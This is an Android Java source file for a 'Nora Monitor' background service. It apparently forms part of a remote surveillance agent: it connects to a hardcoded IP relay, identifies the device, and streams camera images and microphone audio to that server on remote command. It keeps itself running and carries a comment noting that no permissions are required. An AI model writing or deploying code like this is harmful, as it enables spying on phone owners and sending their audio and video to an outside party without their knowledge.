package com.nora.monitor;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

public class MonitorService extends Service {

    private static final String TAG     = "MonitorService";
    private static final String CHANNEL = "nora_monitor";
    private static final int    NOTIF_ID = 1;

    public static final String DEFAULT_RELAY = "http://16.55.3.205:5000";
    public static final String AGENT_SECRET  = "";

    private RelayClient   relay;
    private CameraCapture cameraCapture;
    private MicCapture    micCapture;

    private static MonitorService instance;
    public static MonitorService getInstance() { return instance; }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL, "Nora Monitor", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Basic foreground service — no service type, no permissions required
        Notification notif = new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("Nora Monitor")
            .setContentText("Active")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build();
        startForeground(NOTIF_ID, notif);

        if (relay == null) {
            String deviceName = Settings.Global.getString(getContentResolver(), "device_name");
            if (deviceName == null || deviceName.isEmpty()) deviceName = Build.MODEL;
            relay = new RelayClient(this, deviceName, AGENT_SECRET, DEFAULT_RELAY);
            relay.connect();

            cameraCapture = new CameraCapture(this, jpeg -> relay.emitCamera(jpeg));
            micCapture    = new MicCapture(pcm  -> relay.emitAudio(pcm));
        }

        return START_STICKY;
    }

    public void startCamera()  { if (cameraCapture != null) cameraCapture.start(); }
    public void stopCamera()   { if (cameraCapture != null) cameraCapture.stop();  }
    public void startMic()     { if (micCapture    != null) micCapture.start();    }
    public void stopMic()      { if (micCapture    != null) micCapture.stop();     }

    public RelayClient getRelay() { return relay; }

    @Override
    public void onDestroy() {
        instance = null;
        if (relay         != null) relay.disconnect();
        if (cameraCapture != null) cameraCapture.stop();
        if (micCapture    != null) micCapture.stop();
        super.onDestroy();
    }

    @Nullable @Override
    public IBinder onBind(Intent i) { return null; }
}
